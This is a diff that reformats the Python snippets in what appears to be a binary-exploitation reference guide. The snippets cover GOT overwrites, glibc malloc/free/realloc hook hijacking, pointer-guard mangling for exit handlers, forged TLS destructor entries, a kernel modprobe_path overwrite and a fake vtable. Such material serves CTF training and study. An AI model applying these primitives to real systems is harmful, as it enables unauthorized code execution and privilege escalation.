@@ -62,7 +62,8 @@ description: >-
 ```python
 # Format string GOT overwrite
 from pwn import fmtstr_payload
-payload = fmtstr_payload(offset, {elf.got['printf']: libc.sym['system']})
+
+payload = fmtstr_payload(offset, {elf.got["printf"]: libc.sym["system"]})
 
 # Heap-based GOT overwrite (tcache poisoning)
 # Allocate chunk at GOT address → write system address
@@ -77,18 +78,18 @@ payload = fmtstr_payload(offset, {elf.got['printf']: libc.sym['system']})
 ```python
 # Overwrite __malloc_hook with one_gadget address
 # Triggered by any malloc call (including internal malloc in printf with large format)
-write(libc.sym['__malloc_hook'], one_gadget_addr)
+write(libc.sym["__malloc_hook"], one_gadget_addr)
 # Trigger:
-io.sendline('%100000c')  # printf calls malloc internally for large format
+io.sendline("%100000c")  # printf calls malloc internally for large format
 ```
 
 ### __free_hook
 
 ```python
 # Overwrite __free_hook with system
-write(libc.sym['__free_hook'], libc.sym['system'])
+write(libc.sym["__free_hook"], libc.sym["system"])
 # Trigger: free a chunk containing "/bin/sh"
-chunk_data = b'/bin/sh\x00'
+chunk_data = b"/bin/sh\x00"
 # ... allocate chunk with this data, then free it
 ```
 
@@ -99,8 +100,8 @@ chunk_data = b'/bin/sh\x00'
 # realloc pushes registers and adjusts stack before calling __realloc_hook
 # Set __malloc_hook = realloc+N (skip some pushes to adjust stack alignment)
 # Set __realloc_hook = one_gadget
-write(libc.sym['__realloc_hook'], one_gadget)
-write(libc.sym['__malloc_hook'], libc.sym['realloc'] + 2)  # +2, +4, +6 etc. to adjust
+write(libc.sym["__realloc_hook"], one_gadget)
+write(libc.sym["__malloc_hook"], libc.sym["realloc"] + 2)  # +2, +4, +6 etc. to adjust
 ```
 
 ---
@@ -143,8 +144,11 @@ See [IO_FILE_EXPLOITATION.md](../heap-exploitation/IO_FILE_EXPLOITATION.md) for 
 # 1. Leak or brute-force pointer_guard
 # 2. Compute mangled function pointer:
 import struct
+
+
 def mangle(ptr, guard):
-    return ((ptr ^ guard) << 0x11 | (ptr ^ guard) >> (64-0x11)) & 0xffffffffffffffff
+    return ((ptr ^ guard) << 0x11 | (ptr ^ guard) >> (64 - 0x11)) & 0xFFFFFFFFFFFFFFFF
+
 
 # 3. Write mangled one_gadget/system to __exit_funcs entry
 # 4. Trigger: call exit() or return from main
@@ -184,8 +188,8 @@ Typically at fs:[offset] — offset found via libc symbol or brute-force
 # 2. Compute tls_dtor_list address
 # 3. Forge a tls_dtor_list entry:
 entry = p64(mangled_func_ptr)  # func (mangled with pointer guard)
-entry += p64(arg_value)         # obj (passed as argument to func)
-entry += p64(0)                 # next = NULL (end of list)
+entry += p64(arg_value)  # obj (passed as argument to func)
+entry += p64(0)  # next = NULL (end of list)
 # 4. Write entry to heap, set tls_dtor_list to point to it
 # 5. Trigger: exit() → __call_tls_dtors() → func(obj)
 ```
@@ -225,7 +229,7 @@ for each loaded library (link_map entry):
 ```python
 # 1. Arbitrary kernel write: overwrite modprobe_path ("/sbin/modprobe")
 #    with "/tmp/x" (attacker's script)
-kernel_write(modprobe_path_addr, b'/tmp/x\x00')
+kernel_write(modprobe_path_addr, b"/tmp/x\x00")
 
 # 2. Prepare script:
 # echo '#!/bin/sh' > /tmp/x
@@ -276,10 +280,10 @@ See [kernel-exploitation](../kernel-exploitation/SKILL.md) for kernel write prim
 ```python
 # 1. Leak object address and vptr
 # 2. Create fake vtable in controlled memory:
-fake_vtable = p64(0)              # offset -0x10 (RTTI info)
-fake_vtable += p64(0)             # offset -0x08 (RTTI info)
-fake_vtable += p64(target_func)   # virtual function 0 → system / one_gadget
-fake_vtable += p64(target_func)   # virtual function 1
+fake_vtable = p64(0)  # offset -0x10 (RTTI info)
+fake_vtable += p64(0)  # offset -0x08 (RTTI info)
+fake_vtable += p64(target_func)  # virtual function 0 → system / one_gadget
+fake_vtable += p64(target_func)  # virtual function 1
 # 3. Overwrite vptr to point to fake_vtable + 0x10 (skip RTTI prefix)
 # 4. Trigger: call virtual function on the object
 ```
